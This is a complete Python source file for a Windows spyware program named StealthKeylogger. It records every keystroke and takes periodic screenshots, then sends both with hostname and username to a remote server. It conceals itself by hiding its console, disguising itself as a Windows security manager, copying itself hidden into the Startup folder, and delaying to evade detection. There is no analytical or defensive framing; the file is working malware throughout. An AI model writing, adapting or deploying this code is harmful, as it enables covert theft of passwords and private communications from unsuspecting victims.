import win32gui
import win32console
import win32event
import win32api
from pynput import keyboard
import requests
import json
import threading
import pyautogui
import os
import io
import ctypes
import sys
import shutil
import subprocess
import time
import socket
from pathlib import Path

# Constants
FILE_ATTRIBUTE_HIDDEN = 0x02
MUTEX_NAME = "Global\\WindowsSecurityUpdateManager"

class StealthKeylogger:
    def __init__(self):
        self.public_url = self.get_server_url()
        self.keystroke_buffer = ""
        self.keystroke_interval = 15  # seconds
        self.screenshot_interval = 120  # seconds
        self.mutex = None
        
    def get_server_url(self):
        """Get server URL from embedded resource or file"""
        try:
            # Try to read from embedded resource (for compiled exe)
            if hasattr(sys, '_MEIPASS'):
                resource_path = Path(sys._MEIPASS) / "server_url.txt"
                if resource_path.exists():
                    return resource_path.read_text().strip()
            
            # Try to read from local file
            local_path = Path("server_url.txt")
            if local_path.exists():
                return local_path.read_text().strip()
                
        except Exception:
            pass
        
        # Fallback - you might want to hardcode a URL here
        return None
    
    def check_single_instance(self):
        """Ensure only one instance is running"""
        try:
            self.mutex = win32event.CreateMutexW(None, False, MUTEX_NAME)
            if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                sys.exit()
        except:
            pass
    
    def hide_console(self):
        """Hide console window"""
        try:
            win = win32console.GetConsoleWindow()
            win32gui.ShowWindow(win, 0)  # SW_HIDE
        except:
            pass
    
    def install_persistence(self):
        """Install persistence via startup folder"""
        try:
            startup_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            current_exe = Path(sys.executable if hasattr(sys, 'frozen') else sys.argv[0])
            
            if not current_exe.exists():
                return
                
            target_path = startup_dir / "WindowsSecurityManager.exe"
            
            # Only copy if not already there or if different version
            if not target_path.exists() or target_path.stat().st_size != current_exe.stat().st_size:
                shutil.copy2(current_exe, target_path)
                ctypes.windll.kernel32.SetFileAttributesW(str(target_path), FILE_ATTRIBUTE_HIDDEN)
                
        except Exception as e:
            pass
    
    def send_keystrokes(self):
        """Send buffered keystrokes to server"""
        while True:
            try:
                if self.keystroke_buffer and self.public_url:
                    payload = json.dumps({"keystrokes": self.keystroke_buffer})
                    response = requests.post(
                        f"{self.public_url}/",
                        data=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10
                    )
                    if response.status_code == 200:
                        self.keystroke_buffer = ""
            except Exception:
                # On error, keep buffer for next attempt
                pass
            
            time.sleep(self.keystroke_interval)
    
    def capture_screenshot(self):
        """Capture and send screenshot"""
        try:
            if not self.public_url:
                return
                
            screenshot = pyautogui.screenshot()
            buf = io.BytesIO()
            screenshot.save(buf, format="PNG")
            buf.seek(0)
            
            response = requests.post(
                f"{self.public_url}/screenshot",
                files={"file": ("screenshot.png", buf, "image/png")},
                timeout=30
            )
        except Exception:
            pass
    
    def schedule_screenshots(self):
        """Take screenshots at regular intervals"""
        while True:
            self.capture_screenshot()
            time.sleep(self.screenshot_interval)
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.keystroke_buffer += key.char
            else:
                # Special keys
                special_keys = {
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.space: ' ',
                    keyboard.Key.backspace: '[BS]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.delete: '[DEL]',
                }
                
                if key in special_keys:
                    self.keystroke_buffer += special_keys[key]
                else:
                    self.keystroke_buffer += f'[{key.name}]'
                    
        except AttributeError:
            pass
    
    def get_system_info(self):
        """Gather basic system information"""
        try:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME')
            return f"\n[System: {hostname} | User: {username}]\n"
        except:
            return "\n[System Info]\n"
    
    def run(self):
        """Main execution method"""
        # Anti-debug and stealth measures
        self.check_single_instance()
        self.hide_console()
        self.install_persistence()
        
        # Add system info to initial buffer
        self.keystroke_buffer = self.get_system_info()
        
        # Start background threads
        threading.Thread(target=self.send_keystrokes, daemon=True).start()
        threading.Thread(target=self.schedule_screenshots, daemon=True).start()
        
        # Start keylogger
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()

def main():
    # Add small random delay to avoid pattern detection
    time.sleep(5)
    
    keylogger = StealthKeylogger()
    keylogger.run()

if __name__ == "__main__":
    main()